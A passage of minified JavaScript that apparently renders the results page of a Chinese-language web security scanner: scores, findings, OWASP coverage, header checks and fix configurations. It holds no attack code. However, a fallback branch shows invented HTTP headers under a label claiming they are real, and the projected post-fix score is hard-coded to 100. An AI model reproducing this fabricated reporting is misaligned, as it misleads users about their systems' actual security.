onmouseout="this.style.background='rgba(59,130,246,0.15)'">扫描最终地址</button>`,n+="</div></div>"),n+='<div class="score-ring-wrap score-pulse">',n+='<div class="score-ring" style="background:'+o+'">',n+='<div class="score-value" style="color:#fff">'+e.score+"</div>",n+='<div class="score-label" style="color:rgba(255,255,255,0.7)">安全评分</div>',n+="</div></div>",n+='<div class="report-url">'+E(e.url||"")+"</div>",n+='<div class="report-time">'+(e.time||"")+"</div>",n+='<span class="risk-badge '+s+'">'+(e.risk_level||"未知")+"</span>",n+="</div>";let c="";if(i+t>0?c="当前结果显示存在 "+i+" 个高风险和 "+t+" 个中风险项，建议优先修复对外暴露面并在发布前复测。":r>0?c="当前风险以低危和提示项为主，建议保持修复节奏并持续监控。":c="当前未发现明显风险，可作为基线结果保留，并在版本变更后复测。",n+='<div class="card fade-in-up" style="animation-delay:0.05s;padding:14px;margin-top:12px;border:1px solid rgba(75,110,175,0.25);background:rgba(60,63,65,0.9)">',n+='<div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:6px">',n+='<div style="font-size:13px;font-weight:700;color:var(--text-primary)">管理层摘要</div>',n+='<div style="font-size:12px;color:var(--text-secondary)">'+(e.restricted?"受限扫描，结论需人工确认":"可直接进入修复闭环")+"</div>",n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">'+E(c)+"</div>",n+='<div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:10px;font-size:12px;color:var(--text-secondary)">',n+="<span>总发现："+(e.findings.length||0)+"</span>",n+="<span>高/中风险："+i+"/"+t+"</span>",n+="<span>最近评分："+e.score+"</span>",n+="</div>",n+="</div>",n+='<div class="risk-stats fade-in-up" style="animation-delay:0.1s">',n+='<div class="risk-stat high"><div class="num">'+i+'</div><div class="label">高风险</div></div>',n+='<div class="risk-stat medium"><div class="num">'+t+'</div><div class="label">中风险</div></div>',n+='<div class="risk-stat low"><div class="num">'+r+'</div><div class="label">低风险</div></div>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.15s">',n+='<div class="card-title">安全维度雷达</div>',n+='<div id="radar-chart-container" style="display:flex;justify-content:center"></div>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.2s">',n+='<div class="card-title">风险演示</div>',n+='<p style="margin:0 0 14px 0;font-size:12px;color:var(--text-secondary)">展示常见风险场景，用于说明问题影响</p>',n+='<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">',n+=`<button onclick="simulateCSRF('`+be(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(199,84,80,0.3);background:rgba(199,84,80,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#dc2626;transition:background 0.15s" onmouseover="this.style.background='rgba(199,84,80,0.15)'" onmouseout="this.style.background='rgba(199,84,80,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">CSRF</div>',n+='<div style="font-size:11px;font-weight:400;color:#7f1d1d">跨站请求伪造</div></button>',n+=`<button onclick="simulateXSS('`+be(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(240,167,50,0.3);background:rgba(240,167,50,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#ea580c;transition:background 0.15s" onmouseover="this.style.background='rgba(240,167,50,0.15)'" onmouseout="this.style.background='rgba(240,167,50,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">XSS</div>',n+='<div style="font-size:11px;font-weight:400;color:#f0a732">跨站脚本</div></button>',n+=`<button onclick="simulateClickjacking('`+be(e.url)+`')" style="padding:10px 8px;border:1px solid rgba(168,85,247,0.3);background:rgba(168,85,247,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#9333ea;transition:background 0.15s" onmouseover="this.style.background='rgba(168,85,247,0.15)'" onmouseout="this.style.background='rgba(168,85,247,0.08)'">`,n+='<div style="font-size:13px;font-weight:600;color:var(--text-primary)">Clickjacking</div>',n+='<div style="font-size:11px;font-weight:400;color:#c084fc">点击劫持</div></button>',n+="</div>",n+='<div id="attack-demo-result" style="margin-top:14px"></div>',n+="</div>",e.score_breakdown&&e.score_breakdown.length>0){let l=e.score_breakdown.reduce(function(re,ae){return re+ae.deduction},0),A=0,J=0,N=0,$=0,q=[],te=[],B=[],C=[];e.score_breakdown.forEach(function(re){re.severity==="critical"?(A+=re.deduction,q.push(re)):re.severity==="high"?(J+=re.deduction,te.push(re)):re.severity==="medium"?(N+=re.deduction,B.push(re)):($+=re.deduction,C.push(re))}),n+='<div class="card fade-in-up" style="animation-delay:0.25s">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">',n+='<div style="display:flex;align-items:center;gap:10px">',n+='<div class="card-title" style="margin:0">评分解读</div>',n+="</div>",n+='<span style="font-size:12px;background:rgba(240,167,50,0.15);color:#ea580c;padding:3px 10px;border-radius:2px;font-weight:600">共扣 '+l+" 分</span>",n+="</div>",n+='<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">';let ee=Math.max(A,J,N,$,1);[{label:"严重",count:q.length,deduct:A,color:"#dc2626",bg:"rgba(220,38,38,0.15)"},{label:"高风险",count:te.length,deduct:J,color:"#f0a732",bg:"rgba(240,167,50,0.15)"},{label:"中风险",count:B.length,deduct:N,color:"#f0a732",bg:"rgba(240,167,50,0.15)"},{label:"低风险",count:C.length,deduct:$,color:"#73c990",bg:"rgba(115,201,144,0.15)"}].forEach(function(re){let ae=re.count>0?Math.max(re.deduct/ee*100,8):0;n+='<div style="display:flex;align-items:center;gap:10px">',n+='<span style="font-size:12px;color:var(--text-secondary);min-width:48px;font-weight:600">'+re.label+"</span>",n+='<div style="flex:1;height:20px;background:var(--bg-secondary);border-radius:2px;overflow:hidden;position:relative">',n+='<div style="height:100%;width:'+ae+"%;background:"+re.color+';border-radius:2px;transition:width 0.6s ease"></div>',n+='<span style="position:absolute;right:8px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:700;color:'+(ae>30?"#fff":"var(--text-secondary)")+'">'+re.count+" 项 / -"+re.deduct+"分</span>",n+="</div></div>"}),n+="</div>",n+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:12px 14px">',n+='<div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:8px;display:flex;align-items:center;gap:6px">',n+="<span>修复优先级建议</span>",n+="</div>";let V=[];q.length>0&&V.push('<strong style="color:#dc2626">紧急</strong>：立即修复严重漏洞（'+q.length+"项）"),te.length>0&&V.push('<strong style="color:#f0a732">重要</strong>：优先修复高风险配置问题（'+te.length+"项）"),B.length>0&&V.push('<strong style="color:#ca8a04">常规</strong>：计划修复中风险项（'+B.length+"项）"),C.length>0&&V.push('<strong style="color:#16a34a">可选</strong>：低风险项可按需优化（'+C.length+"项）"),V.length===0&&V.push('<strong style="color:#16a34a">优秀</strong>：未发现明显安全问题'),n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">'+V.join("<br/>")+"</div>",n+="</div>",n+='<details style="margin-top:12px">',n+='<summary style="cursor:pointer;font-size:12px;font-weight:600;color:var(--text-secondary);list-style:none">',n+='<span style="display:inline-flex;align-items:center;gap:6px">',n+='<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>',n+="查看完整扣分明细",n+="</span></summary>",n+='<div style="margin-top:10px;max-height:240px;overflow-y:auto;padding-right:4px">',q.concat(te,B,C).forEach(function(re,ae){let oe=re.severity==="critical"?"#dc2626":re.severity==="high"?"#f0a732":re.severity==="medium"?"#ca8a04":"#16a34a",ne=re.severity==="critical"?"严重":re.severity==="high"?"高":re.severity==="medium"?"中":"低";n+='<div style="display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid var(--border-light);font-size:12px">',n+='<div style="display:flex;align-items:center;gap:8px">',n+='<span style="font-size:9px;font-weight:700;padding:2px 6px;border-radius:2px;background:'+oe+"20;color:"+oe+'">'+ne+"</span>",n+='<span style="color:var(--text-primary)">'+E(re.item)+"</span>",n+="</div>",n+='<span style="font-weight:700;color:'+oe+'">- '+re.deduction+"</span>",n+="</div>"}),n+="</div></details>",n+="</div>"}let g=e.score||0,v=Math.min(98,g+25),d=i+t,f=Math.max(0,Math.round(d*.25)),h=0,m=0,u=0,y=0;if(e.findings&&(e.findings.forEach(function(l){let A=l.name||"";A.indexOf("缺少")>=0&&A.indexOf("头")>=0&&h++,(A.indexOf("敏感路径")>=0||A.indexOf("目录遍历")>=0||A.indexOf(".env")>=0)&&u++}),m=0,y=Math.max(0,u-2)),n+='<div class="card fade-in-up" style="animation-delay:0.18s">',n+='<div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">',n+='<div class="card-title" style="margin:0">复测前后对比</div>',n+='<span style="font-size:11px;background:rgba(115,201,144,0.15);color:#16a34a;padding:2px 8px;border-radius:2px;font-weight:600">预估</span>',n+="</div>",n+='<div style="overflow-x:auto">',n+='<table style="width:100%;border-collapse:collapse;font-size:13px">',n+='<thead><tr style="border-bottom:1px solid #555555">',n+='<th style="text-align:left;padding:10px 8px;font-weight:600;color:var(--text-secondary)">项目</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测前</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测后</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">变化</th>',n+="</tr></thead>",n+="<tbody>",[{label:"安全评分",before:g,after:v,unit:"分",good:"up"},{label:"中高风险",before:d,after:f,unit:"个",good:"down"},{label:"缺失安全头",before:h,after:m,unit:"个",good:"down"},{label:"敏感路径风险",before:u,after:y,unit:"个",good:"down"},{label:"建议处理时间",before:"2 小时",after:"15 分钟",unit:"",good:"down"}].forEach(function(l,A){let J="";if(typeof l.before=="number"&&typeof l.after=="number"){let $=l.after-l.before,q=$>0?"#16a34a":$<0?"#dc2626":"var(--text-secondary)",te=$>0?"+"+$:String($);J='<span style="color:'+q+';font-weight:700">'+te+"</span>"}else J='<span style="color:#16a34a;font-weight:700">大幅缩短</span>';let N=A%2===0?"transparent":"#313335";n+='<tr style="background:'+N+';border-bottom:1px solid #555555">',n+='<td style="padding:10px 8px;font-weight:600">'+l.label+"</td>",n+='<td style="text-align:center;padding:10px 8px;color:var(--text-secondary)">'+l.before+(l.unit?" "+l.unit:"")+"</td>",n+='<td style="text-align:center;padding:10px 8px;color:var(--text-primary);font-weight:700">'+l.after+(l.unit?" "+l.unit:"")+"</td>",n+='<td style="text-align:center;padding:10px 8px">'+J+"</td>",n+="</tr>"}),n+="</tbody></table>",n+="</div>",n+='<p style="margin:12px 0 0 0;font-size:11px;color:var(--text-light);line-height:1.5">提示：以上为基于当前扫描结果的修复预估效果，实际效果取决于修复配置的应用完整度。</p>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.12s;text-align:center;padding:20px">',n+='<div class="card-title">安全维度雷达图</div>',n+=on(e),n+="</div>",n+='<div class="ai-advisor fade-in-up" style="animation-delay:0.15s">',n+='<div class="ai-avatar">顾问</div>',n+='<div class="ai-bubble">',n+='<div class="ai-tag">安全顾问</div>',n+="<p>"+E(e.ai_report.summary)+"</p>",n+='<div class="priority">优先处理：'+E(e.ai_report.priority)+"</div>",n+="</div></div>",n+='<div class="card fade-in-up" style="animation-delay:0.2s">',n+='<div class="card-title">导出</div>',n+='<p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">发现 '+e.findings.length+" 个问题，导出报告与修复配置</p>",n+='<div style="display:flex;gap:10px;flex-wrap:wrap">',n+=`<button class="fixer-btn primary" onclick="downloadReport('pdf')">下载 PDF 报告</button>`,n+='<button class="fixer-btn secondary" onclick="downloadAllFixes()">导出修复配置包</button>',n+="</div>",n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.25s">',n+='<div class="card-title">OWASP Top 10 覆盖</div>',e.owasp_coverage.forEach(function(l){let A=l.status==="通过"?"pass":l.status==="高风险"?"fail":l.status==="低风险"?"warn":"unknown",J=l.status==="通过"?"pass":l.status==="高风险"?"fail":l.status==="低风险"?"warn":"unknown";n+='<div class="owasp-item">',n+='<span class="owasp-label">'+E(l.category)+"</span>",n+='<div class="owasp-bar-wrap"><div class="owasp-bar '+J+'"></div></div>',n+='<span class="owasp-status '+A+'">'+E(l.status)+"</span>",n+="</div>"}),n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.28s">',n+='<div class="card-title">响应头检测',n+=' <span style="font-size:12px;color:var(--success);font-weight:400">(基于真实 HTTP 响应)</span>',n+="</div>",n+='<div class="code-block" style="font-size:12px;line-height:2">',e.header_details&&e.header_details.length>0){if(n+='<div style="color:#64748b">HTTP/1.1 200 OK</div>',n+="<div>Date: "+new Date().toUTCString()+"</div>",e.raw_headers){let l=e.raw_headers;l.server&&(n+='<div>Server: <span style="color:#f0a732">'+E(l.server)+'</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>'),l["content-type"]&&(n+="<div>Content-Type: "+E(l["content-type"].split(";")[0])+"</div>")}n+='<div style="color:#94a3b8;margin-top:4px">--- Security Headers ---</div>',e.header_details.forEach(function(l){l.status==="present"?n+='<div style="color:var(--success)">'+E(l.name)+": "+E(l.value||"(已配置)")+" [已配置]</div>":l.status==="missing"?n+='<div style="color:var(--danger)">'+E(l.name)+': <span style="color:var(--text-lighter)">[缺失]</span> </div>':l.status==="leak"?n+='<div style="color:#f0a732">'+E(l.name)+': <span style="color:#f0a732">'+E(l.value)+"</span> 信息泄露</div>":l.status==="warning"?n+='<div style="color:#f0a732">'+E(l.name)+': <span style="color:#f0a732">'+E(l.value||"")+"</span> 配置风险</div>":l.status==="not_set"&&(n+='<div style="color:var(--text-lighter)">'+E(l.name)+': <span style="color:var(--text-lighter)">[未设置]</span></div>')})}else n+='<div style="color:#64748b">HTTP/1.1 200 OK</div>',n+='<div>Server: <span style="color:#f0a732">nginx/1.18.0</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>',n+="<div>Date: "+new Date().toUTCString()+"</div>",n+="<div>Content-Type: text/html; charset=utf-8</div>",e.score>=50?n+='<div style="color:var(--success)">X-Frame-Options: DENY [已配置]</div>':n+='<div style="color:var(--danger)">X-Frame-Options: <span style="color:var(--text-lighter)">[缺失]</span></div>',e.score>=60?n+='<div style="color:var(--success)">X-Content-Type-Options: nosniff </div>':n+='<div style="color:var(--danger)">X-Content-Type-Options: <span style="color:var(--text-lighter)">[缺失]</span> </div>',e.score>=70?n+='<div style="color:var(--success)">Strict-Transport-Security: max-age=31536000 </div>':n+='<div style="color:var(--danger)">Strict-Transport-Security: <span style="color:var(--text-lighter)">[缺失]</span> </div>',e.score>=65?n+='<div style="color:var(--success)">Content-Security-Policy: default-src &#x27;self&#x27; </div>':n+='<div style="color:var(--danger)">Content-Security-Policy: <span style="color:var(--text-lighter)">[缺失]</span> </div>';n+="</div></div>",n+='<div class="section-title fade-in-up" style="animation-delay:0.3s">漏洞详情 / Findings</div>',(!e.findings||e.findings.length===0)&&(n+='<div class="card fade-in-up" style="animation-delay:0.35s;text-align:center;padding:40px 20px;background:#3c3f41;border:1px solid #555555">',n+='<h3 style="margin:0 0 8px;color:#73c990;font-size:16px">安全状况良好</h3>',n+='<p style="color:var(--text-secondary);margin:0 0 16px;font-size:13px;line-height:1.6">本次扫描未发现明显的安全配置问题。<br/>建议保留当前结果作为基线，并在版本变更后复测。</p>',n+='<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">',n+=`<button onclick="navigateTo('scan')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">重新扫描</button>`,n+=`<button onclick="navigateTo('evolution')" style="background:transparent;color:var(--text);border:1px solid var(--border);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px">查看进化中心</button>`,n+="</div></div>"),e.findings.forEach(function(l){if(!l.confidence_level&&typeof l.confidence!="number"){let A=l.name||"";A.indexOf("缺少")===0||A.indexOf("HSTS")>=0||A.indexOf("CSP")>=0||A.indexOf("X-Frame")>=0||A.indexOf("X-Content")>=0||A.indexOf("Referrer")>=0||A.indexOf("Permissions")>=0?(l.confidence_level="高",l.cv_reason="响应头确定性检测"):A.indexOf("敏感路径")>=0||A.indexOf("敏感文件")>=0||A.indexOf("目录")>=0?(l.confidence_level="中",l.cv_reason="HTTP 状态码推断"):A.indexOf("信息泄露")>=0||A.indexOf("Server")>=0||A.indexOf("版本")>=0?(l.confidence_level="高",l.cv_reason="响应头内容匹配"):(l.confidence_level="中",l.cv_reason="启发式检测")}});let k="",x="";if(e.findings.forEach(function(l,A){let J=Hi(l.level),N=e.scan_id||e.id||0,$=e.finding_feedback_map&&e.finding_feedback_map[l.name]||null,q=$&&$.is_false_positive?" fp-marked":"",te=$&&$.is_confirmed?" confirmed":"",B="",C="",ee=l.level||l.severity||"";ee==="严重"||ee==="critical"||ee==="高风险"||ee==="高危"?(B="紧急",C="priority-urgent"):ee==="中风险"||ee==="中危"||ee==="medium"?(B="重要",C="priority-important"):(B="一般",C="priority-normal");let K=J;k+='<div class="result-list-item'+(A===0?" active":"")+'" id="finding-list-'+A+'" onclick="selectFinding('+A+`)" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();selectFinding(`+A+');}">',k+='<div class="finding-name">'+E(l.name)+"</div>",k+='<div class="finding-meta"><span class="severity-dot '+K+'"></span><span>'+E(l.level)+'</span><span class="severity-tag '+C+'">'+B+"</span></div>",k+="</div>",x+='<div class="finding-detail'+(A===0?" active":"")+'" id="finding-detail-'+A+'" data-finding-name="'+E(l.name)+'" data-scan-id="'+N+'">',x+='<div class="finding-detail-header">',x+='<span class="finding-level '+J+'">'+E(l.level)+"</span>",x+='<span class="finding-name">'+E(l.name)+"</span>",x+='<span class="finding-priority '+C+'">'+B+"</span>",$&&$.is_false_positive?x+='<span class="fp-badge">已标记为误报</span>':$&&$.is_confirmed&&(x+='<span class="confirmed-badge">已确认</span>'),x+="</div>",x+='<div class="finding-detail-body">',x+='<div class="finding-section"><h4>问题摘要</h4><p>'+E(l.summary)+"</p></div>",x+='<div class="finding-section"><h4>OWASP 分类</h4><p>'+E(l.owasp)+"</p></div>",l.location&&l.location.target&&(x+='<div class="finding-section" style="background:#313335;border:1px solid #555555;"><h4>漏洞定位</h4>',x+='<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:6px">',x+='<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px;font-weight:600">'+E(l.location.target)+"</span>",l.location.detail&&(x+='<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px">'+E(l.location.detail)+"</span>"),x+="</div></div>"),x+='<div class="finding-section"><h4>智能检查</h4><p>'+E(l.ai_advice).replace(/\n/g,"<br>")+"</p></div>",x+='<div class="finding-section"><h4>修复建议</h4><p>'+E(l.fix)+"</p></div>";let V="";if(l.evidence&&(l.evidence.header&&l.name.indexOf("缺少")===0?V="命中响应头缺失："+l.evidence.header:l.evidence.reason&&(l.name.indexOf("敏感路径")>=0||l.name.indexOf("敏感文件")>=0)?V="命中内容特征："+l.evidence.reason:l.name.indexOf("robots.txt")>=0||l.name.indexOf("Robots")>=0?V="robots.txt 是公开协议文件，仅作为信息项展示":l.evidence.reason&&(V=l.evidence.reason)),V&&(x+='<div style="margin-top:6px;font-size:12px;color:var(--text-lighter);border-top:1px dashed var(--border);padding-top:6px">判断依据：'+E(V)+"</div>"),l.evidence){let le=Ei(l.evidence);le?x+='<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px">'+le+"</div></details>":x+='<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px;font-size:12px;color:var(--text-lighter)">无额外技术细节</div></details>'}if(l.fixes&&Object.keys(l.fixes).length>0){let le=l.fixes,xe={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask/FastAPI",spring_boot:"Spring Boot",cloudflare:"Cloudflare"},p=["nginx","apache","express","flask","spring_boot","cloudflare"].filter(function(D){return le[D]&&le[D].length>0});if(p.length>0){let D=A;x+='<div style="margin-top:8px">',x+='<div style="display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap">',p.forEach(function(R,_){let w=_===0;x+=`<button onclick="switchFixPlatform('`+R+`', 'finding-fix-')" id="finding-fix-tab-`+R+'" style="padding:4px 10px;border-radius:2px;border:1px solid '+(w?"var(--primary)":"var(--border)")+";background:"+(w?"var(--primary)":"transparent")+";color:"+(w?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+xe[R]+"</button>"}),x+="</div>",p.forEach(function(R,_){let w=_===0?"block":"none";x+='<div id="finding-fix-content-'+R+'" style="display:'+w+'">',le[R].forEach(function(T,W){let Z=typeof T=="string"?T:T.code||"",L=typeof T=="object"&&T.risk_note||"",X="fix-copy-"+R+"-"+W;x+='<div style="position:relative;margin-bottom:6px">',x+='<pre style="background:#2b2b2b;border:1px solid #555555;padding:10px;padding-right:50px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin:0">'+E(Z)+"</pre>",x+=`<button onclick="copyFixCode('`+X+`')" id="`+X+`-btn" aria-label="复制修复代码" style="position:absolute;top:6px;right:6px;padding:6px 12px;min-height:0;background:#45494a;color:#bbbbbb;border:1px solid #555555;border-radius:2px;font-size:12px;font-weight:600;cursor:pointer;transition:background 0.15s" onmouseover="this.style.background='#4b6eaf';this.style.color='#fff'" onmouseout="this.style.background='#45494a';this.style.color='#bbbbbb'">复制</button>`,x+='<textarea id="'+X+'" style="position:absolute;left:-9999px">'+E(Z)+"</textarea>",x+="</div>",L&&(x+='<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:#3d2929;border-radius:2px;margin-bottom:6px">'+E(L)+"</div>")}),x+="</div>"}),x+="</div>"}}if(l.remediation&&(x+='<div class="finding-section"><h4>修复步骤</h4><ul>',(l.remediation.steps||[]).forEach(function(le){x+="<li>"+E(le)+"</li>"}),x+="</ul></div>",l.remediation.nginx&&(x+='<div class="finding-section"><h4>Nginx 配置</h4><div class="code-block">'+E(l.remediation.nginx)+"</div></div>"),l.remediation.apache&&(x+='<div class="finding-section"><h4>Apache 配置</h4><div class="code-block">'+E(l.remediation.apache)+"</div></div>"),l.remediation.node&&(x+='<div class="finding-section"><h4>Node.js 配置</h4><div class="code-block">'+E(l.remediation.node)+"</div></div>"),l.remediation.verify&&(x+='<div class="finding-section"><h4>验证方法</h4><p>'+E(l.remediation.verify)+"</p></div>")),l.verify_steps&&l.verify_steps.length>0?(x+='<div class="finding-section">',x+="<h4>验证修复（三步验证法）</h4>",x+='<div style="display:flex;flex-direction:column;gap:10px;margin-top:8px">',l.verify_steps.forEach(function(le,xe){let p=["1.","2.","3."][xe]||xe+1+".";x+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 12px;border-left:3px solid var(--success)">',x+='<div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">',x+='<span style="font-size:12px;font-weight:700;color:var(--text-primary)">第 '+(xe+1)+" 步："+E(le.method||"验证")+"</span>",x+="</div>",le.command&&(x+='<div style="font-size:12px;color:var(--text-secondary);margin-bottom:5px">操作：</div>',x+='<pre style="margin:0 0 6px 0;padding:6px 8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">'+E(le.command)+"</pre>"),le.expect&&(x+='<div style="font-size:12px;color:var(--text-secondary);display:flex;align-items:flex-start;gap:4px">',x+='<span style="color:#73c990;font-weight:700;flex-shrink:0">预期：</span>',x+='<span style="color:var(--text-primary)">'+E(le.expect)+"</span>",x+="</div>"),x+="</div>"}),x+="</div>",x+='<div style="margin-top:8px;padding:6px 10px;background:rgba(115,201,144,0.08);border-radius:2px;font-size:12px;color:#15803d;border:1px solid rgba(115,201,144,0.2)">',x+="<strong>提示：</strong>建议按顺序执行三步验证，全部通过后再使用本工具重新扫描确认。",x+="</div>",x+="</div>"):l.verify_method&&(x+='<div class="finding-section"><h4>验证方法</h4><p>'+E(l.verify_method)+"</p></div>"),l.evidence&&Object.keys(l.evidence).length>0){x+='<div style="margin-top:8px;padding:10px;background:var(--bg-secondary);border-radius:2px;font-size:12px">',x+='<div style="font-weight:600;margin-bottom:4px;color:var(--primary)">证据详情</div>';let le=Ei(l.evidence);le?x+=le:x+='<div style="color:var(--text-lighter)">无额外技术细节</div>',x+="</div>"}let fe=l.confidence_level||"",re=typeof l.confidence=="number"?l.confidence:null,ae=l.cv_reason||"",oe="finding-confidence";fe==="高"?oe+=" high":fe==="中"?oe+=" medium":fe==="低"?oe+=" low":re!==null&&(re>=80?oe+=" high":re>=60?oe+=" medium":oe+=" low"),x+='<div class="finding-feedback-row" data-finding-name="'+E(l.name)+'" data-scan-id="'+N+'">',x+='<span style="color:var(--text-light)">置信度</span>',fe?x+='<span class="'+oe+'">'+E(fe)+"</span>":re!==null?x+='<span class="'+oe+'">'+re+"%</span>":x+='<span class="'+oe+'">未评估</span>',ae&&(x+='<span style="font-size:12px;color:var(--text-lighter)">· '+E(ae)+"</span>"),(l.review_required||fe==="中")&&(x+='<span style="font-size:11px;background:var(--warning);color:#000;padding:1px 6px;border-radius:2px;margin-left:6px">建议人工复测</span>');let ne=$&&($.is_false_positive||$.is_confirmed)?" disabled":"";x+=`<button class="finding-feedback-btn btn-confirm" onclick="submitFindingFeedback(this, '`+be(l.name)+"', "+N+', false)" '+ne+">准确</button>",x+=`<button class="finding-feedback-btn btn-fp" onclick="submitFindingFeedback(this, '`+be(l.name)+"', "+N+', true)" '+ne+">误报</button>",$&&$.is_false_positive?x+='<span class="fp-reason-text">已标记为误报，将用于优化后续检测</span>':$&&$.is_confirmed&&(x+='<span class="fp-reason-text" style="color:#73c990">已确认为真实问题，感谢您的反馈</span>'),x+="</div>",x+="</div></div>"}),e.findings&&e.findings.length>0&&(n+='<div class="result-workbench">',n+='<div class="result-list-panel"><div class="result-list-header">Findings ('+e.findings.length+')</div><div class="result-list">'+k+"</div></div>",n+='<div class="result-detail-panel" id="result-detail-panel">'+x+"</div>",n+="</div>"),e.fixes&&Object.keys(e.fixes).length>0){let l=e.fixes,A={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask/FastAPI",spring_boot:"Spring Boot",cloudflare:"Cloudflare"},N=["nginx","apache","express","flask","spring_boot","cloudflare"].filter(function($){return l[$]&&l[$].length>0});N.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.3s;border:2px solid rgba(115,201,144,0.4);background:#3c3f41,rgba(115,201,144,0.01))">',n+='<div style="font-weight:700;font-size:16px;margin-bottom:10px;color:var(--success)"> 修复建议（'+N.length+" 种平台）</div>",n+='<div style="display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap">',N.forEach(function($,q){let te=q===0;n+=`<button onclick="switchFixPlatform('`+$+`')" id="fix-tab-`+$+'" style="padding:6px 14px;border-radius:2px;border:1px solid '+(te?"var(--primary)":"var(--border)")+";background:"+(te?"var(--primary)":"transparent")+";color:"+(te?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+A[$]+"</button>"}),n+="</div>",N.forEach(function($,q){let te=q===0?"block":"none";n+='<div id="fix-content-'+$+'" style="display:'+te+'">',l[$].forEach(function(B){let C=typeof B=="string"?B:B.code||"",ee=typeof B=="object"&&B.risk_note||"";n+='<pre style="background:var(--bg-secondary);padding:12px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin-bottom:8px">'+E(C)+"</pre>",ee&&(n+='<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:rgba(240,167,50,0.1);border-radius:2px;margin-bottom:8px">'+E(ee)+"</div>")}),n+="</div>"}),n+="</div>")}n+='<div class="gen-fix-section fade-in-up" style="animation-delay:0.4s">',n+="<h3> 一键生成修复配置</h3>",n+='<p class="card-desc" style="margin-bottom:14px">输入您的配置，系统将根据扫描结果生成可直接参考的修复建议</p>',n+='<div class="gen-fix-row">',n+='<input type="text" id="gen-fix-input" placeholder="粘贴配置或输入 server 块..." />',n+='<button class="gen-fix-btn" onclick="generateFixFromResult()"> 生成</button>',n+="</div>",n+='<div id="gen-fix-output"></div>',n+="</div>";let I=Math.min(100,112);if(n+='<div class="score-compare fade-in-up" style="animation-delay:0.45s">',n+="<h3> 复测后评分对比</h3>",n+='<div class="score-rings">',n+='<div class="score-ring-item">',n+='<div class="ring" style="background:'+Lt(e.score)+'">',n+='<div class="val" style="color:#fff">'+e.score+"</div>",n+='<div class="lbl" style="color:rgba(255,255,255,0.7)">复测前</div>',n+="</div>",n+='<div class="tag">复测前</div>',n+="</div>",n+='<div class="score-ring-item">',n+='<div class="ring" id="score-after-ring" style="background:'+Lt(I)+'">',n+='<div class="val" style="color:#fff">'+I+"</div>",n+='<div class="lbl" style="color:rgba(255,255,255,0.7)">复测后</div>',n+="</div>",n+='<div class="tag">复测后</div>',n+="</div>",n+="</div>",n+='<div class="score-improve" id="score-diff"> 提升 <strong>'+(I-e.score)+"</strong> 分 <span>（"+e.score+" -> "+I+"）</span></div>",n+='<div class="score-rules"><p>评分规则：基础 100 分 - 高风险(18) - 中风险(10) - 低风险(4) + 修复配置(+12) + 